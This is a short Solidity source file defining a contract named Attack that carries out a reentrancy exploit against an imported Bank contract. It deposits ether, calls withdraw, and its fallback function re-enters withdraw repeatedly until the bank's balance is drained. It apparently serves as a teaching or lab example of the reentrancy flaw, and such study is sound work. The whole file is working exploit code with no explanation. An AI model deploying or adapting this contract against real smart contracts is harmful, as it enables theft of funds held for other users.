// SPDX-License-Identifier: UNLICENSED 
pragma solidity 0.8.17;
import { Bank } from "./Bank.sol";

contract Attack {
    Bank public immutable bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    function attack() public payable {
        bank.deposit{ value: msg.value }();
        bank.withdraw();
    }

    fallback() external payable {
        if (address(bank).balance > 0 ether) {
            bank.withdraw();
        }
    }

}
